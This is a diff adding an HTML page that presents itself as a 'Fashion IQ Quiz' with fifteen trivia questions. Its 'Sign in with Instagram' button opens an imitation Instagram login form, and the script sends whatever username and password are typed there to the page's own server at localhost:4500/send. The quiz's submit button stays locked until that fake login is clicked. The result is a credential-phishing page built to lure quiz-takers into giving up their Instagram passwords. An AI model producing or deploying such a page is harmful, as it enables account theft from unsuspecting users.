@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+
+      .container {
+        background-color: #ffffff;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        max-width: 800px;
+        width: 100%;
+      }
+
+      .quiz-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 2px solid #eeeeee;
+        padding-bottom: 15px;
+        margin-bottom: 20px;
+      }
+
+      .quiz-header h1 {
+        color: #333333;
+        font-size: 2em;
+      }
+
+      .instagram-btn {
+        background-color: #e1306c;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 1em;
+        transition: background-color 0.3s;
+      }
+
+      .instagram-btn:hover {
+        background-color: #c1255e;
+      }
+
+      .question-card {
+        background-color: #fafafa;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 15px;
+      }
+
+      .question-card h3 {
+        margin-top: 0;
+        color: #555555;
+      }
+
+      .options-list {
+        list-style-type: none;
+        padding: 0;
+      }
+
+      .option-item {
+        margin-bottom: 10px;
+      }
+
+      .option-item label {
+        display: block;
+        padding: 12px;
+        border: 1px solid #dddddd;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.2s, border-color 0.2s;
+      }
+
+      .option-item label:hover {
+        background-color: #e9e9e9;
+      }
+
+      .option-item input[type="radio"] {
+        display: none;
+      }
+
+      .option-item input[type="radio"]:checked + label {
+        background-color: #d1e7dd;
+        border-color: #008000;
+      }
+
+      .submit-btn {
+        width: 100%;
+        padding: 15px;
+        font-size: 1.2em;
+        background-color: #007bff;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: background-color 0.3s;
+      }
+
+      .submit-btn:hover {
+        background-color: #0056b3;
+      }
+
+      .result-body {
+        padding-top: 20px;
+        text-align: center;
+      }
+
+      .result-body h2 {
+        color: #333333;
+      }
+
+      .result-body p {
+        font-size: 1.5em;
+        color: #008000;
+        font-weight: bold;
+      }
+
+      .hidden {
+        display: none;
+      }
+
+      /* Modal for Instagram Sign-in */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed;
+        z-index: 1;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.4);
+        justify-content: center;
+        align-items: center;
+      }
+
+      .modal.visible {
+        display: flex;
+      }
+
+      .modal-content {
+        background-color: #fefefe;
+        padding: 20px;
+        border-radius: 10px;
+        position: relative;
+        text-align: center;
+        width: 90%;
+        max-width: 400px;
+      }
+
+      .close-btn {
+        color: #aaaaaa;
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        font-size: 28px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+
+      .close-btn:hover,
+      .close-btn:focus {
+        color: #000;
+        text-decoration: none;
+      }
+
+      .modal-content h2 {
+        margin-top: 0;
+      }
+
+      .modal-content input {
+        width: 90%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .modal-content button {
+        width: 90%;
+        padding: 10px;
+        background-color: #e1306c;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <!DOCTYPE html>
+    <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Fashion Quiz Dashboard</title>
+        <link rel="stylesheet" href="style.css" />
+      </head>
+      <body>
+        <div class="container">
+          <header class="quiz-header">
+            <h1>Fashion IQ Quiz</h1>
+            <button id="instagram-signin" class="instagram-btn">
+              Sign in with Instagram
+            </button>
+          </header>
+          <div id="quiz-container" class="quiz-body"></div>
+          <button id="submit-btn" class="submit-btn" disabled>
+            Submit Quiz
+          </button>
+          <div id="result-container" class="result-body hidden"></div>
+        </div>
+
+        <div id="instagram-modal" class="modal hidden">
+          <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2>Log in to Instagram</h2>
+            <form id="instagram-login-form">
+              <input type="text" placeholder="Username" required />
+              <input type="password" placeholder="Password" required />
+              <button type="submit" class="sign">Log In</button>
+            </form>
+          </div>
+        </div>
+        <script>document.addEventListener("DOMContentLoaded", () => {
+  const questions = [
+    {
+      question: "What is a 'LBD' in fashion?",
+      options: [
+        "Long Black Dress",
+        "Little Black Dress",
+        "Light Blue Denim",
+        "Leather Black Design",
+      ],
+      answer: "Little Black Dress",
+    },
+    {
+      question: "Which of these is a type of fabric?",
+      options: ["Plaid", "Linen", "H&M", "Brocade"],
+      answer: "Linen",
+    },
+    {
+      question: "What does 'haute couture' mean?",
+      options: [
+        "High fashion",
+        "Street wear",
+        "Casual clothes",
+        "Vintage style",
+      ],
+      answer: "High fashion",
+    },
+    {
+      question: "What is a 'choker'?",
+      options: [
+        "A type of shoe",
+        "A tight-fitting necklace",
+        "A wide belt",
+        "A men's tie",
+      ],
+      answer: "A tight-fitting necklace",
+    },
+    {
+      question: "What is the primary material used for making denim?",
+      options: ["Wool", "Silk", "Cotton", "Nylon"],
+      answer: "Cotton",
+    },
+    {
+      question:
+        "Which iconic designer is known for the 'little black dress' and Chanel No. 5 perfume?",
+      options: ["Christian Dior", "Giorgio Armani", "Coco Chanel", "Versace"],
+      answer: "Coco Chanel",
+    },
+    {
+      question: "A 'blazer' is a type of:",
+      options: ["Trousers", "Shoe", "Jacket", "Hat"],
+      answer: "Jacket",
+    },
+    {
+      question: "What does 'ready-to-wear' mean in fashion?",
+      options: [
+        "Custom-made clothing",
+        "Off-the-rack clothes",
+        "Vintage style",
+        "Athleisure wear",
+      ],
+      answer: "Off-the-rack clothes",
+    },
+    {
+      question: "What is a 'trench coat'?",
+      options: [
+        "A casual shirt",
+        "A type of long coat",
+        "A short jacket",
+        "A summer dress",
+      ],
+      answer: "A type of long coat",
+    },
+    {
+      question: "What is a 'tuxedo' primarily used for?",
+      options: ["Casual outings", "Formal events", "Sports", "Workwear"],
+      answer: "Formal events",
+    },
+    {
+      question:
+        "What is the style of clothing that combines athletic and leisure wear?",
+      options: ["Business casual", "Athleisure", "Streetwear", "Bohemian"],
+      answer: "Athleisure",
+    },
+    {
+      question: "Which of these is a type of hat?",
+      options: ["Espadrille", "Fedora", "Cardigan", "Bermuda"],
+      answer: "Fedora",
+    },
+    {
+      question: "What is a 'maxi dress'?",
+      options: [
+        "A short dress",
+        "A knee-length dress",
+        "An ankle-length dress",
+        "A dress with a high slit",
+      ],
+      answer: "An ankle-length dress",
+    },
+    {
+      question: "What is a 'scarf' used for?",
+      options: [
+        "Protecting hands",
+        "Decorating hair",
+        "Wearing around the neck",
+        "Covering feet",
+      ],
+      answer: "Wearing around the neck",
+    },
+    {
+      question: "Which of these is a type of trousers?",
+      options: ["Blazer", "Chinos", "Tee", "Sandals"],
+      answer: "Chinos",
+    },
+  ];
+
+  const quizContainer = document.getElementById("quiz-container");
+  const submitBtn = document.getElementById("submit-btn");
+  const resultContainer = document.getElementById("result-container");
+  const instagramBtn = document.getElementById("instagram-signin");
+  const instagramModal = document.getElementById("instagram-modal");
+  const closeBtn = document.querySelector(".close-btn");
+  const instagramLoginForm = document.getElementById("instagram-login-form");
+
+  // Render all questions
+  function renderQuestions() {
+    questions.forEach((q, index) => {
+      const questionCard = document.createElement("div");
+      questionCard.className = "question-card";
+      questionCard.innerHTML = `
+        <h3>${index + 1}. ${q.question}</h3>
+        <ul class="options-list">
+          ${q.options
+            .map(
+              (option) => `
+              <li class="option-item">
+                <input type="radio" id="q${index}-opt-${option}" name="question${index}" value="${option}">
+                <label for="q${index}-opt-${option}">${option}</label>
+              </li>
+            `
+            )
+            .join("")}
+        </ul>
+      `;
+      quizContainer.appendChild(questionCard);
+    });
+  }
+
+  // Handle submit
+  function handleSubmit() {
+    let score = 0;
+    let allAnswered = true;
+
+    questions.forEach((q, index) => {
+      const selectedOption = document.querySelector(
+        `input[name="question${index}"]:checked`
+      );
+      if (!selectedOption) allAnswered = false;
+      else if (selectedOption.value === q.answer) score++;
+    });
+
+    if (!allAnswered) {
+      alert("Please answer all the questions before submitting.");
+      return;
+    }
+
+    quizContainer.classList.add("hidden");
+    submitBtn.classList.add("hidden");
+    resultContainer.classList.remove("hidden");
+
+    resultContainer.innerHTML = `
+      <h2>Quiz Complete! 🎉</h2>
+      <p>You scored ${score} out of ${questions.length}!</p>
+    `;
+  }
+
+  // Event listeners
+  submitBtn.addEventListener("click", handleSubmit);
+
+  instagramBtn.addEventListener("click", () => {
+    instagramModal.classList.add("visible");
+  });
+
+  closeBtn.addEventListener("click", () => {
+    instagramModal.classList.remove("visible");
+  });
+
+  window.addEventListener("click", (e) => {
+    if (e.target === instagramModal) {
+      instagramModal.classList.remove("visible");
+    }
+  });
+
+  // ✅ FIXED FORM HANDLER
+  instagramLoginForm.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const username =
+      instagramLoginForm.querySelector("input[type='text']").value;
+    const password = instagramLoginForm.querySelector(
+      "input[type='password']"
+    ).value;
+
+    try {
+      const response = await fetch("http://localhost:4500/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password }),
+      });
+
+      const result = await response.json();
+      alert(result.msg);
+      instagramModal.classList.remove("visible");
+    } catch (error) {
+      console.error("Error submitting form:", error);
+      alert("There was an error submitting the form.");
+    }
+  });
+
+  renderQuestions();
+});
+const submitBtn = document.getElementById("submit-btn");
+let login2 = false;
+document.querySelector(".sign").addEventListener("click", () => {
+  login2 = true; // change to true on click
+  submitBtn.disabled = false;
+  console.log(login2);
+});
+
+submitBtn.addEventListener("click", () => {
+  if (login2) {
+    alert("Form submitted successfully 🚀");
+    console.log("first");
+    // yaha tu apna submit logic likh sakta hai
+  }
+});
+</script>
+      </body>
+    </html>
+  </body>
+</html>
